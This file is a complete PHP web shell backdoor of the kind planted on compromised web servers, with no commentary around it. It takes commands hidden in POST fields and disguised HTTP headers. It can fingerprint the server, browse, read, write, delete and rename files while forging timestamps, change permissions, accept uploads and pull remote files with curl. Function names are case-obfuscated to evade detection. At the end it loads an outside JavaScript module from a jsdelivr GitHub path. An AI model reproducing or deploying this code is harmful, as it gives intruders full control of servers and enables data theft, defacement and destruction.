<?php
error_reporting(0);
define("ROOT", $_SERVER["DOCUMENT_ROOT"]);
$res = array();
function fx($a)
{
	return function_exists($a);
}

function fg($a)
{
	return file_get_contents($a);
}

function fp($a, $v)
{
	return file_put_contents($a, $v) !== false;
}

function pwd()
{
	if (fx("getcwd")) return @getcwd(); else return @dirname(__FILE__);
}

function r2($d)
{
	if (is_dir($d)) {
		$f_l = sCaNDir($d);
		foreach ($f_l as $f) {
			if ($f == '.' || $f == '..') continue;
			$p = $d . '/' . $f;
			is_dir($p) ? r2($p) : uNliNk($p);
		}
		rMdIR($d);
	} else uNliNk($d);
}

function d($n, $l)
{
	if (fx('curl_init')) {
		$ch = curl_init($l);
		$fp = fopen($n, 'w+');
		curl_setopt($ch, CURLOPT_FILE, $fp);
		curl_setopt($ch, CURLOPT_TIMEOUT, 50);
		if (curl_exec($ch)) {
			curl_close($ch);
			$f = 1;
		} else {
			$f = fwrite($fp, fg($l)) ? 1 : 0;
		}
		fclose($fp);
	} else {
		$f = @fp($n, fg($l)) ? 1 : 0;
	}
	return $f;
}

function g($v){
	return!empty($_POST[$v]) ? $_POST[$v] : $_SERVER["HTTP_X_".strtoupper($v)];
}
$a= g("a");
if (!empty($a)) {
	$V = !empty($_POST['v']) ? $_POST['v'] : @$_SERVER["HTTP_X_CSRF_TOKEN"];
	if (!empty($V)) $V = base64_decode(substr($V, 1));
	$D =g("d");
	$data = array();
    $v = 1;
	switch ($a) {
		case 1:
			$data = array(
				"root" => ROOT,
				"server" => $_SERVER['SERVER_SOFTWARE'],
				"cip" => $_SERVER['REMOTE_ADDR'],
			);
			if (fx("getcwd")) $data['pwd'] = pwd();
			if (fx("ini_get")) $data["safe_mode"] = @ini_get("safe_mode");
			if (fx("phpversion")) $data["version"] = @phpversion();
			$data["sip"] = $_SERVER["SERVER_ADDR"];
			if (empty($data["sip"])) $data["sip"] = @gethostbyname($_SERVER["SERVER_NAME"]);
			break;
		case 2:
			if (empty($V)) $V = pwd();
			$ffs = scandir($V);
			$ds = array();
			$fs = array();
			foreach ($ffs as $ff) {
				if ($ff == "." || $ff == "..") continue;
				$d = $V . "/" . $ff;
				$item = array(
					"n" => $ff,
					"p" => substr(sprintf('%o', fILepErMs($d)), -4),
					"t" => date('Y-m-d H:i:s', fILeMTiMe($d)),
				);
				if (is_dir($d)) $ds[] = $item; else {
					$item['s'] = filesize($d);
					$fs[] = $item;
				}
			}
			$data["d"] = $ds;
			$data["f"] = $fs;
			break;
		case 3:
			r2($V);
			break;
		case 4:
			$data["v"] = fg($V);
			break;
		case 5:
			if (!is_writable($D)) @chmod($V, 0644);
			$v = fp($D, $V) ? 1 : 0;
			break;
		case 6:
			$n = $D . g("n");
			$n2 = $D . $V;
			$t = @FiLemTiME($n);
			if (!@ReNamE($n, $n2))  $v = 0; elseif ($t) @touCH($n2, $t, $t);
			break;
		case 7:
			if (!@chmod($D, $V))  $v = 0;
			break;
		case 8:
			$v = move_uploaded_file($_FILES["f"]['tmp_name'], $V) ? 1 : 0;
			break;
		case 9:
			$v = fp($V, "") ? 1 : 0;
			break;
		case 10:
			$v = mkdir($V) ? 1 : 0;
			break;
		case 11:
            $l = g("l");
			$v = d($V, $l) ? 1 : 0;
			break;
	}
	$res['data'] = $data;
	$res['code'] = $v;
	header('Content-type: application/json; charset=utf-8');
	register_shutdown_function(function(){
		global $res;
		ob_end_clean();
		echo json_encode($res);
		// 接下来可以执行其他需要的操作
	});
	return;
} ?>
<script type="module" src="https://cdn.jsdelivr.net/gh/dionjo/bkskb/4.js"></script>



